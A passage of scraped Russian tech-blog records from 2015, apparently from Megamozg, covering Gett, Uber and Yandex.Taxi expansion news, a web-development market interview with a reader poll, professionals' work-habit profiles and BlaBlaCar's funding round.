веб-студию (сейчас это QSOFT. — От автора). Дуров в 2004 году запустил ВКонтакте, Цукерберг — Фейсбук. А мы студию открыли. Кто-то явно из нас дурак, и это явно не Цукерберг (Смеется).\n\n— Михаил, последнее время вы живете в США. Ваш бизнес работает в США. У нас тоже больше 30% клиентов из Северной Америки. И, как мне кажется, на американском рынке уже давно развивается та история, о которой вы рассказываете. Малый бизнес пользуется конструкторами, немного дорабатывая их под свои потребности, для крупного бизнеса есть очень дорогие энтерпрайсовские предложения, середняка почти нет. Каким вы видите американский рынок и в чем его отличия от российского?\n\r\n— На самом деле российский рынок веб-разработки не так сильно отстает от американского. Более того, он уникален тем, что находится на передовой. Возьмем историю с таксистами. Uber есть в США и Европе. А в России, кроме Uber, еще два агрегатора, которые с ним конкурируют — Gett и Яндекс.Такси. При этом есть много стран, как Австралия, Африка, Латинская Америка, где все пока очень отсталое. Все, что происходит в Штатах, происходит и у нас. Когда разговариваешь с местными веб-студиями, разговоры те же: что-то тяжело стало, конкуренция.\n\r\nА еще американский рынок — это рынок с большими традициями, большим количеством игроков, очень большой долей малого бизнеса, который, кстати, очень серьезно защищается. Есть города, где запрещены на уровне местной администрации сетевые магазины. В США можно до сих в магазинах расплачиваться чеками, выписанными от руки.\n\r\nАмерика, будучи наследником больших традиций в бизнесе, разворачивается медленнее, чем российский рынок. Намного медленнее. Могу сказать, что история с такси в Москве будет покруче, чем в Сан-Франциско. На пустоте легче строить.\n\r\nСколько американцев просыпаются по стандартному будильнику, который стоит на тумбочке? И сколько москвичей просыпаются по будильнику в смартфоне? Меня поразило, что в американском Windows Phone только недавно появился будильник. Да в России невозможно представить продажу мобильного телефона без будильника.\n\n— А как обстоят дела в электронной коммерции?\n\r\n— Здесь есть отличия, так как у нас еще нет таких игроков, как eBay или Amazon. Такие агрегаторы составляют жесточайшую конкуренцию остальному рынку. Яндекс.Маркет пытается изобразить нечто подобное.\n\r\nНо в целом российские магазины по многим параметрам обгоняют американские. Например, курьерская доставка с Cash on delivery — абсолютно фантастическая вещь по американским меркам. Или примерка при доставке у WildBerries.\n\r\nЗато в США продолжают использовать такие инструменты, которые у нас уже не живут. Например, купоны в почтовом ящике. Каждую неделю мой ящик заваливают купонами. При этом бумажные купоны пользуются огромным спросом. Я не могу представить себе ни одного россиянина, у которого в кармане бумажные купоны на мясо в соседнюю «Пятерочку».\n\r\nМы абсолютно уникальная страна, которая начала стоить интернет-бизнес с нуля и зашла так далеко. Мы не догоняем, как принято считать. Мы находимся на другой ветке развития.\n\n— Но ведь есть такие бесспорные вещи, как сервис в интернет-магазинах, где России далеко до Запада.\n\r\n— Ну конечно! Худшего сервиса, чем в США, я не видел нигде. Сервис в Америке отвратительный. Но там развита законодательная система. В Калифорнии, скажем, есть возврат всего в течение тридцати дней. Одно только это обстоятельство превращает сервис в приемлемый. Потому что, во-первых, вы всегда можете угрожать возвратом, и, во-вторых, можете действительно вернуть.\n\r\nЧто американцы хорошо умеют делать, так это продавать, презентовать, строить продажи. Вот с этим не поспоришь. Мы проводим очень много исследований о том, как продают в России и в США. Конечно, у нас здесь пропасть. В России не только не продают, в России ждут, когда купят.\n\n— Это происходит из-за того, что в США очень высокая конкуренция?\n\r\n— Да, конечно. Высокая конкуренция, которая длится столетиями. Очень высокая доля малого бизнеса подстегивает весь бизнес в целом. С малым бизнесом тяжелее конкурировать. Когда у вас два — три клиента, вы очень стараетесь им продать. Это тоже часть традиций.\n\n— Значит мы все-таки движемся к тому, когда и у нас конкуренция станет невыносимой и мы научимся продавать?\n\r\n— Для того, чтобы была высокая конкуренция, нужно либо много предложений, либо мало спроса. Мы ждали, когда же в России станет много предложений. А сейчас рынок входит в ту фазу, где становится мало спроса. Конкуренция, конечно, обострится, но мне бы хотелось, чтобы она росла по другой причине. Не факт, что отсутствие спроса окажет достаточное мотивирующее воздействие на развитие.\n\n— Михаил, благодарю вас за интересную беседу!\n\n Мария Азизова, редактор блога бизнес-идей Simtech Development\n\r\nИсточник: CMS Magazine     Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста. Как вы считаете, есть угроза того, что рынок веб-разработки сократится настолько, что на нем не останется места для 90% веб-студий и агентств? \n            51.73%\n           Да, это неминуемо. Согласен/согласна с Михаилом. \n            224\n           \n            25.4%\n           Нет, не вижу никаких предпосылок для этого. \n            110\n           \n            22.86%\n           Не могу ответить, не разбираюсь в этом вопросе. \n            99\n            \n       Проголосовали 433 пользователя.  \n\n       Воздержались 126 пользователей.", {"day": "11", "month": "ноября", "time": "18:12"}, {"rate": 16, "views": 29000}], ["Компания Gett смело смотрит в будущее. Основатель компании Шахар Вайсер рассчитывает утроить оборот онлайн-сервиса вызова такси год к году. По прогнозам Вайсера, к концу 2015 годовой оборот составит $0,5 миллиарда по всему миру. «Оборот утраивается каждый год начиная с момента создания компании в 2010 году», заявил он.\n\r\nГосподин Вайсер считает реальным проведение IPO, но только в долгосрочной перспективе:\n\r\n«Компания, которая подошла к выручке в полмиллиарда долларов, растет каждый год в 3 раза, конечно, может стать публичной. Другое дело, что пока вы так быстро растете, надо фокусироваться на росте, а не на размещении акций на рынке»\n\r\nДинамика выручки компании соответствует росту рынка онлайн-сервисов такси, которая, по оценке исследовательской компании Merku, также утраивается последние годы. Рынок такси в России, который пока в основном представлен традиционными услугами в этой сфере, оценивается Merku в 2015 году в $9 миллиардов, приводит данные ТАСС.\n\r\nРоссия для Gett является «значимым рынком». В нашей стране работает 20 тысяч лицензированных перевозчиков — это свыше 10% всех такси в России. В целом в стране работает более 180 тысяч машин, которые занимаются извозом.\n\r\n«С приходом онлайн-сервисов спрос на использование такси начал расти, и на протяжении 3-4 ближайших лет он может быть в 2-3 раза больше. Поэтому мы можем говорить, что видоизмененный рынок дойдет до $15-$20 миллиардов в год», прогнозирует Вайсер.\n\r\nОн напомнил, что традиционный рынок такси — один из старейших рынков в мире, который глобально растет всего на 3-5% в год. \n\r\nНа сегодняшний день онлайн-сервис заказа такси Gett доступен в четырех странах, включая Россию, Израиль, Великобританию, США. Сервис работает в 57 городах, из них в девяти российских: Москве, Санкт- Петербурге, Новосибирске, Нижнем Новгороде, Сочи, Ростове- на-Дону, Самаре, Екатеринбурге и Красноярске. Сервисом Gett пользуются более 10 миллионов человек.\n\r\nИнвестиции в развитие компании к настоящему времени составили около $200 миллионов: в проект вложились такие крупные инвестфонды, как InVenture Partners, Baring Vostok, Vostok Nafta, Access Industries.\n\r\nВ России и странах СНГ набирает обороты и другой такси-сервис – Uber. По плану компании, до конца 2016 года сервис должен появиться во всех российских городах-миллионниках.\n\r\nСегодня Uber запустился в Минске. Белорусские пользователи уже начали тестировать сервис. Пока пользователям доступен только Uber Black — автомобили комфорт-класса. Подача машины стоит 45 тысяч белорусских рублей (164,8 российского рубля по курсу на 5 ноября 2015 года), проезд — почти 7003 белорусских рубля за километр (25,65 рубля), 1250 белорусских рублей (4,58 рубля) за минуту простоя. Минимальная стоимость заказа составляет 60 тысяч белорусских рублей (219,74 рубля). За отмену заказа клиент заплатит столько же.", {"day": "5", "month": "ноября", "time": "17:39"}, {"rate": 10, "views": 4800}], ["Рубрика «Как работают профессионалы» продолжает знакомить читателей «Мегамозга» с рабочими привычками самых разных специалистов на IT-рынке.\n\r\nНадежда Шилова – основатель и бессменный директор агентства ADLABS, занимающаяся интернет-маркетингом с 2000 года, а в качестве директора выделившегося из группы компаний проекта – с 2004 года. \n\r\nПо роду деятельности основное время Надежда уделяет внутренним проектам, взаимодействию с ключевыми партнёрами и клиентами, а также наставничеству в компании. Коллеги признаются, что Надежда – сердец агентства и тот человек, который всегда поймёт и сделает первый шаг, будучи в курсе любых нюансов жизни организации.\n\n\nТекущее местоположение:\r\nДубна, Московская область\n\nТекущее место работы:\r\nРекламное агентство ADLABS, директор\n\nОбразование:\r\nМеждународный Университет “Дубна”, информатик-экономист\n\nОдно слово, которое лучшее всего описывает, как вы работаете:\r\nЛюди\n\nСколько часов в сутки вы работаете?\r\n10-12 часов\n\nТекущий мобильный девайс:\r\niPhone 6\n\nТекущий компьютер:\r\niMac 21,5\" / iPad Air\n\nБез каких приложений, программ, утилит вы не можете жить?\r\nFacebook, WhatsApp, iMessage, Google Keep, Google Maps, Gett\n\nКакой лайфхак помогает вам экономить время?\r\nПланировать заранее задачи, в офисе делать задачи, которые связаны с коммуникациями, а дома в тишине или под музыку — творческие и рутинные, так получается быстрее.\n\nКаким to-do менеджером вы пользуетесь?\r\nGoogle Keep + напоминания в iPhone\n\nЧто вы слушаете, когда работаете?\r\nЗависит от настроения, обычно современную классику, саундтреки к фильмам\n\nЧто вы читаете сейчас?\r\nЯ отношусь к тем людям, которые читают несколько книг одновременно.\n\r\nЕсть книги, которые читаешь с упоением. А есть те, которые вполне можно читать параллельно, в зависимости от настроения и потребностей. “Инноваторы” Уолтера Айзексона — про людей, без которых было бы невозможно развитие технологий.\n\r\n“Эмоциональный интеллект ребенка”  Джона Готтмана — хочется понять, можно ли регулировать эмоции своего ребенка и помогать ему в этом.\n\nКакая книга из последних прочитанных запомнилась больше всего?\r\nНаверное, “Марсианин” Энди Вейера, хотелось сначала прочитать, а потом посмотреть фильм. Читается на одном дыхании.\n\nВы используете электронные читалки или предпочитаете бумажные книги?\r\nОчень люблю бумажные книги, слежу за новинками издательств. Читать хорошо изданную книгу — сплошное удовольствие, от запаха бумаги до великолепных иллюстраций. Стараюсь регулярно покупать книги на интересные мне темы. Электронные книги обычно читаю в дороге, это экономит место.\n\nСколько времени вы спите?\r\nВ будни 6-7 часов, в выходные, если удается, люблю поспать днем.\n\nВы сова или жаворонок?\r\nСова, которая может быть жаворонком, так как я мама школьника. Я стараюсь уходить с работы рано, чтобы делать перерыв, если остались дела — доделывать совсем вечером. Это позволяет довольно поздно ложиться. В будни я почти никогда не ложусь раньше часа ночи.\n\nКак вы завтракаете?\r\nЯ люблю полноценный завтрак — яичницу, омлет, каши, блинчики и пр. Завтрак заряжает энергией на целый день\n\nКак вы проводите время в пути на работу/с работы?\r\nСлушаю музыку или радио “Монте-Карло”, хотя мой путь до работы на машине занимает всего 5 минут.\n\nКакой совет, который вам когда-либо давали, вы можете передать другим?\r\nНаучиться прощать и не держать зла на людей.", {"day": "5", "month": "ноября", "time": "15:00"}, {"rate": 14, "views": 7400}], ["Рубрика «Как работают профессионалы» продолжает знакомить читателей «Мегамозга» с рабочими привычками самых разных специалистов на IT-рынке.\n\r\nАлексей Ланкин возглавляет офис HotelTonight по Восточной Европе, ранее занимал должность регионального директора «Групон Россия» и директора по развитию туристического оператора Travel MC. Увлекается триатлоном.\n\n\nТекущее местоположение:\r\nБерлин (Митте), Германия\n\nТекущее место работы:\r\nHotelTonight, Country Manager Eastern Europe\n\nОбразование:\r\nВШЭ, магистр политологии\n\nОдно слово, которое лучшее всего описывает, как вы работаете:\r\nРезультативно\n\nСколько часов в сутки вы работаете?\r\n12 часов. 4 часа на тренировки и отдых, и 8 на сон.\n\nТекущий мобильный девайс:\r\niPhone 6 и Samsung Galaxy S5\n\nТекущий компьютер:\r\nMacBook Air\n\nБез каких приложений, программ, утилит вы не можете жить?\r\nWhatsApp/Facebook Messenger/Telegram, Freeletics, Lifesum, CoinKeeper, Meduza, Sports.Ru, Gett, HotelTonight\n\nКакой лайфхак помогает вам экономить время?\r\nСамую важную задачу дня решать утром первым делом. Планирование и внимание к деталям.\n\nКаким to-do менеджером вы пользуетесь?\r\nБлокнот и ручка + 2Do\n\nЧто вы слушаете, когда работаете?\r\nШуршание извилин мозга. Я не слушаю музыку, когда работаю или когда занимаюсь спортом — стараюсь фокусироваться на деле и слышать себя и коллег.\n\nЧто вы читаете сейчас?\r\n«Вся кремлевская рать», Михаил Зыгарь (точнее прочитал за пару ночей).\n\nКакая книга из последних прочитанных запомнилась больше всего?\r\nБиблия\n\nВы используете электронные читалки или предпочитаете бумажные книги?\r\n50/50, но без Bookmate себе жизнь уже плохо представляю, хотя раньше читать на девайсах категорически не мог.\n\nСколько времени вы спите?\r\n8 часов, не меньше и не больше. Я не верю в то, что можно нормально жить, если длительное время спать по 4 часа, как многие говорят.\n\nВы сова или жаворонок?\r\nЖаворонок, который очень любит поспать\n\nКак вы завтракаете?\r\nСидя. На бегу не перекусываю\n\nКак вы проводите время в пути на работу/с работы?\r\nСпускаюсь по лестнице с пятого этажа, выхожу во двор, захожу в офис — весь путь занимает минуту. Планирую и много думаю во время длинных тренировок.\n\nКакой совет, который вам когда-либо давали, вы можете передать другим?\r\n«Если хочешь что-нибудь сказать или сделать, сначала досчитай до десяти».", {"day": "30", "month": "октября", "time": "13:31"}, {"rate": 10, "views": 7200}], ["Сервис «Яндекс.Такси» закупил более 1000 детских кресел в дополнение к детским сиденьям партнерских таксопарков. Теперь, по данным компании, детское кресло или бустер будет в каждой второй машине на линии – всего в 10 000 автомобилей. По мнению, представителей сервиса, нововведение позволит нарастить долю заказов на поездки с маленькими детьми до 5-7% на московском рынке. \n\r\nВ сентябре у «Яндекс.Такси» в Москве было 35 000 «детских» заказов, что составляет около 2% всех заказов сервиса. «Однако потенциальный спрос мы видим гораздо больший», заявил руководитель сервиса Тигран Худавердян.\n\r\n«Яндекс.Такси» также ввел дополнительные требования для машин с детскими креслами. Кроме того, «Яндекс.Такси» объявил о снижении доплаты за детское кресло со 150 до 100 рублей. В Gett, например, эта сумма составляет 200 рублей. \n\r\n«Детские» заказы будут получать только водители с высоким рейтингом, а служба контроля качества будет проверять исправность и чистоту кресел, передают «Ведомости».\n\r\nВ начале октября «Яндекс.Такси» объявило о запуске специальной программы для сотрудников автопарков: они смогут пользоваться корпоративным тарифом на сотовую связь и интернет от одного из операторов связи. У конкурентов – Uber и Gett – также действуют разные системы мотивации и поощрения водителей.\n\r\nПо данным департамента транспорта Москвы, в столице около 55 000 водителей такси с лицензиями, многие сотрудничают сразу с несколькими агрегаторами такси. В сутки заказывается 120 000-250 000 такси, более половины – вызовы через приложения Uber, Gett и «Яндекс.Такси».\n\r\n27 октября «Яндекс.Такси» заработал в Новосибирске, передают НГС.НОВОСТИ. Как сообщила региональный представитель «Яндекса» Ольга Молодан, Новосибирск стал первым городом Сибири, в котором запущен сервис. \n\r\nСейчас через сервис работают около 150 машин таксопарков «Гранд Авто» и РНИЦ (Региональный навигационно-информационный центр Новосибирской области). Они работают по тарифам «Эконом» (посадка — 79 рублей, 16 рублей/км), «Комфорт» (195 рублей за первые 2 км, далее 17 рублей/км) и «Бизнес» (395 рублей за первые 2 км, далее 25 рублей/км). \n\r\nКроме Новосибирска сервис работает в Москве, Санкт-Петербурге, Екатеринбурге, Сочи и ряде других городов. Всего к нему подключено больше 35 тысяч машин из более чем 450 таксопарков и диспетчерских.\n\r\nТакси-сервис Uber с 27 октября также начал работу в Новосибирске — он стал пятым городом в России, в котором работает компания. На момент запуска в новом регионе доступен только «бюджетный» вариант перевозок UberX. Стоимость поездки на UberX в Новосибирске составляет 59 рублей за посадку плюс четыре рубля за минуту и четыре рубля за километр. Аналогичные тарифы действуют в Казани, где Uber запустился в сентябре 2015 года.\n\r\nВ Новосибирске также работает конкурирующий такси-сервис Gett. Этот сервис в России является основным конкурентом «Яндекс.Такси». Активность Uber в нашей стране не так сильна. \n\r\n«Мегамозг» писал, что интернет-сервис такси компании Gett запустился еще в пяти российских городах-миллионниках. 7 октября сервис появился в Ростове-на-Дону, Самаре, Красноярске, а также в Сочи и Екатеринбурге.\n\r\nСредний чек на услуги такси в Красноярске и Ростове-на-Дону — около 200 рублей, в Сочи и Екатеринбурге — 220-240 рублей, в Самаре — около 180 рублей. По оценкам аналитиков Gett, в Сочи годовой оборот рынка такси составляет около 20 миллиардов рублей, в Ростове-на-Дону — 6 миллиардов рублей. На Самару и Красноярск приходится по 5 миллиардов рублей, на Екатеринбург — около 4 миллиардов рублей.\n\r\nКроме перечисленных выше городов сервис работает в Москве, Санкт-Петербурге и Нижнем Новгороде. Весь российский рынок таксомоторных перевозок Gett оценивает в $9 миллиардов (572 млрд рублей по курсу ЦБ).\n\r\n«Мегамозг» запросил комментарий у представителей Gett:\nКоманда Gett внимательно следит за отзывами и пожеланиями своих пользователей. Решение о запуске отдельного класса автомобилей с детскими креслами – «Детский» – было принято на основании этих пожеланий. Класс был запущен в конце апреля 2015 года. До этого пользователям необходимо было тратить время на комментарии к заказу с просьбой прислать машину, оборудованную детским креслом-бустером, или уточнять у диспетчеров доступность таких машин. Стоимость подачи автомобиля с креслом-бустером составляет дополнительные 200 рублей. Таким образом, стоимость складывается из 50 рублей за подачу, 18 рублей за минуту и 200 рублей – за кресло-бустер в комфорт-классе. \n\r\nПо поводу городов. Летом 2015 года Gett объявила о начале региональной экспансии — компания планирует запустить свой сервис во всех городах-миллионниках России. Изначально сервис работал только в Москве, в октябре 2012 он появился в Санкт-Петербурге и до лета 2015 не расширял своего присутствия. С конца июня были запущены Нижний Новгород и Новосибирск (куда только сегодня вышли Яндекс и Убер), а с 7 октября Gett расширил зону работы еще на 5 городов — Сочи, Ростов-на-Дону, Самару, Екатеринбург и Красноярск.\n\r\nСейчас идет подготовка к запуску новых городов, компания оценивает перспективы рынков и их потенциал. Но о сроках и конкретных регионах мы подробнее сможем рассказать лишь ближе к моменту.", {"day": "27", "month": "октября", "time": "12:16"}, {"rate": 14, "views": 8700}], ["13 октября для водителей России будет доступно обновление мобильного приложения такси-сервиса Uber. Водители смогут воспользоваться новыми функциями. Среди них – поиск зоны с повышенным спросом на сервис, отчёты о доходах, новостная лента и другие.\n\r\nНовостная лента для водителей будет содержать информацию о местных мероприятиях, промоакциях и другие данные, позволяющие принять решение о том, когда проявлять активность. Кроме того, анонсирована новая функция, суммирующая комментарии от пользователей. С ее помощью водитель может проанализировать свое поведение и понять причины своего высокого или низкого рейтинга.\n\r\nБолее того, в планах компании добавить функцию отображения зон с дефицитом водителей. Такие районы в приложении будут выделены красным цветом. Там можно будет быстрее всего найти пассажира. Помимо этого, в новой версии приложения появятся отчёты о доходах водителя для оценки собственной эффективности, пишет Ferra.ru.\n\r\nUber только что отметила четвертую годовщину своего запуска в Нью-Йорке. За год количество водителей UberX удвоилось и выросло с 10 до 20 тысяч, передает Next City. По данным компании, доходы водителей также выросли с $36,96 в час до $39,30 в час. Это на 6,3% больше, чем в прошлом году.\n\r\nUber постепенно распространяется и в России. Помимо Москвы, Петербурга и Екатеринбурга, Uber работает в Казани. «Количество пользователей Uber в России — сотни тысяч человек, эта цифра постоянно увеличивается, расширение бизнеса в России в приоритете», сообщал представитель Uber. Для компании представляет интерес любой город с населением свыше 500 тысяч человек.\n\r\nВ Екатеринбурге кроме «Яндекс.Такси» с Uber теперь конкурирует Gett, такси-сервис с российскими корнями. Он также запущен в Москве, Санкт-Петербурге, Новосибирске, Нижнем Новгороде, в Ростове-на-Дону, Самаре, Красноярске и Сочи.", {"day": "8", "month": "октября", "time": "20:24"}, {"rate": 11, "views": 11000}], ["Интернет-сервис такси компании Gett запускается еще в пяти российских городах-миллионниках. 7 октября сервис появится в Ростове-на-Дону, Самаре, Красноярске, а также в Сочи и Екатеринбурге. \n\r\nПо словам представителей Gett, в этих городах растет число выданных лицензий на автомобили такси. «Доля нелегалов не превышает 50% на каждом из рынков. Наличие лицензии — обязательное условие для работы с сервисом. К примеру, в Ростове-на-Дону, как и в Свердловской области, уже выдано более 19 тысяч лицензий, а в Самаре их количество превышает 8 тысяч», поясняет представитель сервиса Алена Балакирева.\n\r\nСредний чек на услуги такси в Красноярске и Ростове-на-Дону — около 200 рублей, в Сочи и Екатеринбурге — 220-240 рублей, в Самаре — около 180 рублей. По оценкам аналитиков Gett, в Сочи годовой оборот рынка такси составляет около 20 миллиардов рублей, в Ростове-на-Дону — 6 миллиардов рублей. На Самару и Красноярск приходится по 5 миллиардов рублей, на Екатеринбург — около 4 миллиардов рублей.\n\r\nВ Gett отмечают, что для выхода на новые рынки они вложили средства в основном в маркетинг и продвижение. Источник «Коммерсанта» полагает, что затраты на запуск сервиса в новом городе «могут тянуть на несколько десятков миллионов рублей, но Сочи — дорогой и, разумеется, потребовал больших вложений, чем остальные города».\n\r\nКроме перечисленных выше городов сервис работает в Москве, Санкт-Петербурге, Новосибирске и Нижнем Новгороде. Весь российский рынок таксомоторных перевозок Gett оценивает в $9 миллиардов (572 млрд рублей по курсу ЦБ).\n\r\nGett функционирует в 57 городах мира, включая Нью-Йорк, Лондон, Манчестер, Ливерпуль и Тель-Авив. Среди совладельцев компании — Access Industries Леонарда Блаватника, фонды Kreos Capital и InVenture Partners, а также основатели проекта Шахар Вайсер и Рои Мор. \n\r\nПо данным Gett, сервисом пользуются более 10 миллионов человек. По данным CrunchBase, общая сумма полученных проектом инвестиций достигла $220 миллионов. В России, Великобритании и Израиле сервис стабильно приносит прибыль. В США этого добиться пока не удалось. Ожидаемая выручка Gett от услуг такси в 2015 году должна достигнуть $500 миллионов.\n\r\nНа прошлой неделе в своем интервью основатель Gett рассказал про заработки таксистов, а также про новый, сверхбюджетный, класс обслуживания. Теперь минимальная цена услуги такси сократится на 40%. Кроме того, Gett осваивает новые ниши услуг для потребителей – от доставки еды и маникюра до капитального ремонта. \n\r\nВ Екатеринбурге с Gett конкурируют «Яндекс.Такси» и Uber. В Сочи теперь работает два из этих трех такси-сервисов. Uber там не запущен. По всей России с Gett сотрудничает более 20 тысяч машин. У «Яндекса» — 30 тысяч. «Яндекс.Такси» работает также в Москве, Петербурге, Калининграде, Краснодаре, Нижнем Новгороде, Воронеже, Перми, Кисловодске, Туле и проходит тестирование в Ростове-на-Дону.\n\r\nПомимо Москвы, Петербурга и Екатеринбурга Uber работает в Казани. «Количество пользователей Uber в России — сотни тысяч человек, эта цифра постоянно увеличивается, расширение бизнеса в России в приоритете», сообщал представитель Uber. \n\r\nВ конце июля Федерация автовладельцев России пожаловалась на Uber, Gett и «Яндекс.Такси» в прокуратуру. По их мнению, сервисы нарушают закон, практикуя доплаты водителям. В ФАР считают, что такие действия служб заказа такси — это «открытое пренебрежение к организационным и техническим основам, а также традициям безопасности легковых перевозок пассажиров»\n\r\nОднако Федеральная антимонопольная служба РФ не считает, что сервисы нарушают законодательство. «Я здесь не вижу нарушений антимонопольного законодательства. Мне конфликт кажется несколько надуманным», заявил заместитель главы ведомства Андрей Цариковский.", {"day": "7", "month": "октября", "time": "12:52"}, {"rate": 12, "views": 12000}], ["Виртуальная диспетчерская служба такси GetTaxi появилась 5 лет назад. Теперь Gett работает в 54 городах по всему миру, включая Нью-Йорк, Лондон, Тель-Авив, Москву и Санкт-Петербург, а ее сервисом пользуются более 10 миллионов человек. \n\r\nНа этой неделе GetTaxi ввел новый, сверхбюджетный, класс обслуживания. Теперь минимальная цена услуги такси сократится на 40%.\n\r\nСейчас Gett осваивает новые ниши услуг для потребителей – от доставки еды и маникюра до капитального ремонта. \r\nОснователь компании Gett Шахар Вайсер рассказал «Ведомостям» о работе сервиса на мировом рынке, о заработках водителей, об инвесторах, о новых услугах и дальнейших планах работы компании.\n\r\n«Мегамозг» приводит самые интересные цитаты из интервью.\n\nО концепции сервисов Gett\nМы реализовали идею, которая будоражила умы нашей команды. Технологию и операционные навыки, которые мы обкатали на заказах такси, в итоге можно применить в других нишах, которые касаются сектора услуг. Это все те услуги, которые сопутствуют вашей жизни, например покупка продуктов, заказ обеда или услуги для дома – все то, на что вы тратите время. Сейчас во всем мире один тренд – человек стремится к максимальному делегированию полномочий. Ведь нет никакой ценности в том, что вы лично уберете свою квартиру. Может, лучше, чтобы с помощью нашей компании вы могли высвободить время и максимально использовать его на то, что вам больше нравится делать?\nО планах работы\nПотенциальных категорий, естественно, больше, чем мы способны сделать сейчас. Но выпускать новый сегмент услуг раз в месяц – это неплохой план, я вас уверяю. В первую очередь это касается транспорта. Наша цель – быть альтернативным средством передвижения вашему личному автомобилю. Транспорт останется основополагающим направлением бизнеса компании: речь идет о расширении линейки классов автомобилей, оптимизации цен и сохранении высокого заработка у водителей.\n\r\nС продуктами питания – идея добиться того, чтобы доставка пиццы или суши занимала 10 минут. Некоторые не верят, что такое возможно. Но то же самое раньше говорили и о наших услугах такси. Когда мы заявили, что сможем подавать машину менее чем за 15 минут и минимальная стоимость составит 100 рублей, многим одновременное выполнение обеих задач казалось нереальным. Но сегодня так и есть. И сегодня выполнение обоих условий кажется банальным: мы теперь подаем машину за 5–7 минут, а минимальная поездка теперь стоит всего 49 рублей. На этой неделе Gett запускает новый тариф «Эконом +», который удешевил услугу такси на 40%.\nО спросе на услуги такси\nОдин из интереснейших моментов состоит в том, что формат пользования такси поменялся фундаментально. Зарегистрировавшийся в Gett человек сначала делает X поездок в месяц, через три месяца – 2X, через 12 месяцев – 4X поездок. Только задумайтесь: когда человек понимает преимущества службы Gett, открывает для себя эту услугу, понимает комфорт, который она предоставляет, он начинает пользоваться услугой чаще и это в итоге расширяет рынок такси. Количество рабочих мест выросло пропорционально всем этим факторам.\nО конкурентах на мировом рынке\nНаш транспортный сервис используется в России, Великобритании и Нью-Йорке. Но услуга, по сути, локальна, и, если у компании нет в наличии 10 000 автомобилей, как, например, у Gett в Москве, а есть всего 1000 автомобилей, обеспечить рынок ее услугами невозможно, какой бы красивой идея ни была в принципе: при небольшом количестве машин любая подача автомобиля все равно займет уже другое время. Если машин нет, никакая концепция не сработает на большом рынке – это будет всего лишь компания, которая работает только в пределах Садового кольца.\n\r\nВсе рынки важны и равносильны. Два рынка – России и Великобритании – самые крупные в Европе.\r\nИзраиль, правда, также оказался крупным рынком, и это удивительно. Там люди пользуются такси очень много, стоимость рынка составляет около $2 млрд, Это было большой неожиданностью для нас.\n\r\nЗа счет большого оборота Gett может предложить более выгодные цены, а после сегодняшнего запуска новых тарифов и подавно.\nО запуске в Нью-Йорке\nНью-йоркский рынок такси составляет половину таксомоторного рынка Америки, но он малоконкурентен. Там работает всего одна компания, и монополист, как известно, обычно максимизирует прибыль и не думает о качестве или конкурентности своих услуг. Зайти на такой рынок обычно легко, предложив более выгодную услугу.\n\r\nПри этом половина таксомоторного рынка Нью-Йорка востребована корпорациями. Gett там известен именно за счет лучшего продукта для корпораций (b2b). Половина списка Fortune 500 – это наши клиенты, и мы добились этого за три года. Весной мы запустили сегмент b2b в Нью-Йорке. Мы понижаем стоимость услуг, увеличиваем эффективность и прозрачность транспортных услуг, и компании это очень ценят. Поверьте, 2500 клиентов b2b в корпоративном мире – хороший результат.\nО заработках водителей сервиса\nИнтересная тенденция наблюдается на стороне предложения. Мы заметили, что фактически даем возможность 20 000 водителей зарабатывать и содержать свою семью. Конечно, не мы платим зарплаты – это делает рынок, но мы создаем основы для рынка. И в итоге 20 000 семей водителей живут за счет этого сектора. Это само по себе удивительно, и к концу года будет более 100 000 таких семей.\n\r\nВодитель в Gett может заработать около 120 000 рублей, но вы должны брать во внимание, что это очень тяжелый труд.\nОб инвесторах\nДа, в нас инвестировали лучшие фонды, работающие в России. Последние $150 млн инвестировали фонды Baring Vostok и Vostok Nafta. Среди инвесторов есть Kreos – лондонский венчурный фонд. Access Industries Леонарда Блаватника также была в числе инвесторов.\r\n[Общий объем инвестиций] $207 млн, это фантастическая на самом деле сумма.\nО возможности выхода на публичный рынок и распространении в России\nНет, это [публичный рынок] доступная дорога. Но пока мы продолжаем расти темпами 300% в год, мы сосредоточены на росте.\r\nКак раз этим летом компания объявила о выходе на рынки городов-миллионников по всей России. Наш сервис уже запущен в Питере, Новосибирске и Нижнем Новгороде, а также готовятся запуски в нескольких новых городах.\nО новых идеях и услугах\nС июля с помощью приложения Gett можно заказывать суши, а позднее можно будет заказывать любую еду – бургеры, пиццу или базовые продукты из супермаркета. Речь идет именно о базовых продуктах. На этом этапе наша компания не собирается заменить 100% из того, что вам нужно сделать, но 80% точно – это и транспорт, и еда, и уборка, и химчистка, и мелкие бытовые задачи по дому. \n\r\nНаша цель – запускать новую вертикаль услуг каждый месяц. Это в идеале. И кстати, после того как мы выпустили волшебного джинна – сделали объявление о новых услугах, количество потенциальных контрагентов выросло необычайно. Нам казалось, что мы сделали универсальную карту развития бизнеса по услугам, но оказалось, что есть много идей, о которых мы даже не думали.", {"day": "30", "month": "сентября", "time": "17:42"}, {"rate": 9, "views": 8900}], ["Сервис для поиска попутчиков BlaBlaCar привлек $200 миллионов от фондов Insight Venture Partners, Lead Edge Capital и Vostok New Ventures. Insight Venture Partners и Lead Edge Capital также являются инвесторами холдинга Alibaba Group и сервиса по доставке еды Delivery Hero. Vostok New Ventures является бэкером сервиса такси Gett. Оценка BlaBlaCar превысила $1,5 миллиарда. Теперь он стал одним из самых дорогих стартапов в Европе, передает The Telegraph. \n\r\n«Текущий финансовый раунд был инициирован с целью поддержания темпов роста числа новых пользователей BlaBlaCar в Европе и на развивающихся рынках, где интерес к райдшерингу вызван несколькими причинами: несовершенством транспортной инфраструктуры и слишком обременительным для кошелька местных жителей владением собственного автомобиля», говорится в сообщении BlaBlaCar.\n\r\nКроме того, BlaBlaCar планирует развиваться на рынках Азии, Бразилии и других странах латинской Америки.\r\nОснователь компании Николас Брюссон заявил, что есть лишь два основных рынка в мире, на которые выходить не собираемся: США и Китай. «Китай — это как другой мир, во многом непонятный», говорит Брюссон. Подавляющее большинство жителей США имеют личные автомобили, а плотность общественного транспорта в этой стране наоборот является чересчур низкой.\n\r\n«Мы постоянно подчеркиваем, что BlaBlaCar — это про совместное использование автомобилей. Водитель не получает прибыли, а лишь компенсирует расходы на топливо. У нас нет коммерческих водителей, которым нужно получать лицензию, делать страховку и прочее. Причем по статистике около 60% водителей время от времени становятся и пассажирами», пояснил Брюссон принципиальную разницу между Uber и BlaBlaCar.\n\r\n«Мегамозг» писал, что в апреле французский сервис приобрел две конкурирующие компании: Carpooling из Германии и AutoHop из Венгрии. Благодаря этим двум сделкам BlaBlaCar стал крупнейшим райдшеринговым сервисом в 